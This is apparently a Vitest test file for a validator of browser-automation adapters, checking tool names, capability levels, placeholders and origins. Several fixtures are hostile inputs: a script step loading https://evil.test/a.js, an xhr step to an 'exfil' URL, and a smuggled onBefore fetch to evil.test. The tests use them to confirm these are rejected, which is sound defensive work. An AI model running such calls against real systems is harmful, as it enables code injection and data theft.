import { describe, expect, it } from 'vitest';
import { highestCapability, summarizeEffects, validateAdapter, type ToolDefinition } from './adapter';

const base = {
  id: 'demo-crm',
  name: 'Demo',
  version: '1.0.0',
  origins: ['https://crm.example.com'],
  tools: [
    {
      name: 'create_customer',
      description: 'Create a customer',
      capability: 'WRITE',
      inputSchema: { type: 'object', properties: { name: { type: 'string' } }, required: ['name'] },
      steps: [
        { type: 'click', selector: '[data-action=go]' },
        { type: 'fill', selector: '#name', value: '{{name}}' },
      ],
    },
  ],
};

const withTool = (patch: Record<string, unknown>) => ({ ...base, tools: [{ ...base.tools[0], ...patch }] });

describe('validateAdapter', () => {
  it('accepts a well-formed adapter', () => {
    const result = validateAdapter(base);
    expect(result.errors).toEqual([]);
    expect(result.ok).toBe(true);
  });

  it('rejects capability values outside the classification', () => {
    expect(validateAdapter(withTool({ capability: 'SUPERUSER' })).ok).toBe(false);
  });

  it('rejects tool names that are not snake_case', () => {
    const result = validateAdapter(withTool({ name: 'CreateCustomer' }));
    expect(result.errors.join(' ')).toContain('snake_case');
  });

  it('rejects duplicate tool names', () => {
    const result = validateAdapter({ ...base, tools: [base.tools[0], base.tools[0]] });
    expect(result.errors.join(' ')).toContain('duplicate tool names');
  });

  // The whole security posture rests on adapters being data. Any step type that
  // could carry executable code must be unrepresentable, not merely discouraged.
  it.each([
    { type: 'eval', code: 'alert(1)' },
    { type: 'script', src: 'https://evil.test/a.js' },
    { type: 'fn', body: 'return 1' },
    { type: 'xhr', url: 'https://evil.test/exfil' },
  ])('rejects steps carrying executable code: %o', (step) => {
    expect(validateAdapter(withTool({ steps: [step] })).ok).toBe(false);
  });

  it('rejects extra properties smuggled onto a known step', () => {
    const step = { type: 'click', selector: '#a', onBefore: 'fetch("https://evil.test")' };
    const result = validateAdapter(withTool({ steps: [step] }));
    // Zod strips unknown keys, so the adapter is accepted but the smuggled
    // property is gone: it can never reach the executor.
    expect(result.ok).toBe(true);
    expect(JSON.stringify(result.adapter)).not.toContain('onBefore');
  });

  it('rejects a placeholder that no declared property can fill', () => {
    const result = validateAdapter(
      withTool({ steps: [{ type: 'fill', selector: '#a', value: '{{not_declared}}' }] }),
    );
    expect(result.errors.join(' ')).toContain('undeclared placeholder');
  });

  it('rejects a required property that is not declared', () => {
    const result = validateAdapter(
      withTool({ inputSchema: { type: 'object', properties: {}, required: ['ghost'] }, steps: [{ type: 'click', selector: '#a' }] }),
    );
    expect(result.errors.join(' ')).toContain('required property "ghost" is not declared');
  });

  // Capability cannot be inferred from steps, but the one unambiguous case is
  // worth enforcing: reading does not submit forms or navigate.
  it('rejects a READ tool that submits or navigates', () => {
    for (const step of [{ type: 'submit', selector: 'form' }, { type: 'navigate', path: '/other' }]) {
      const result = validateAdapter(
        withTool({ capability: 'READ', inputSchema: { type: 'object', properties: {} }, steps: [step] }),
      );
      expect(result.errors.join(' ')).toContain('declared READ but uses the transition step');
    }
  });

  it('allows a READ tool to type into a search box', () => {
    const result = validateAdapter(
      withTool({
        capability: 'READ',
        steps: [
          { type: 'fill', selector: '#q', value: '{{name}}' },
          { type: 'readList', selector: 'li', as: 'rows' },
        ],
      }),
    );
    expect(result.ok).toBe(true);
  });

  it('rejects wildcard origins and requires at least one', () => {
    expect(validateAdapter({ ...base, origins: ['https://*.example.com'] }).ok).toBe(false);
    expect(validateAdapter({ ...base, origins: [] }).ok).toBe(false);
  });

  it('rejects non-object input', () => {
    expect(validateAdapter(null).ok).toBe(false);
    expect(validateAdapter('adapter').ok).toBe(false);
  });
});

describe('summarizeEffects', () => {
  it('counts what the steps actually do', () => {
    const tool = validateAdapter(base).adapter?.tools[0] as ToolDefinition;
    expect(summarizeEffects(tool)).toMatchObject({ clicks: 1, inputs: 1, readOnly: false });
  });

  it('marks a tool that cannot change anything as read-only', () => {
    const adapter = validateAdapter(
      withTool({
        capability: 'READ',
        inputSchema: { type: 'object', properties: {} },
        steps: [
          { type: 'waitFor', selector: 'ul' },
          { type: 'readList', selector: 'li', as: 'rows' },
        ],
      }),
    ).adapter;
    expect(summarizeEffects(adapter!.tools[0] as ToolDefinition).readOnly).toBe(true);
  });
});

describe('highestCapability', () => {
  it('reports the strongest capability in a set', () => {
    expect(highestCapability(['READ', 'WRITE', 'INTERACT'])).toBe('WRITE');
    expect(highestCapability(['READ', 'DESTRUCTIVE'])).toBe('DESTRUCTIVE');
    expect(highestCapability([])).toBe('READ');
  });
});
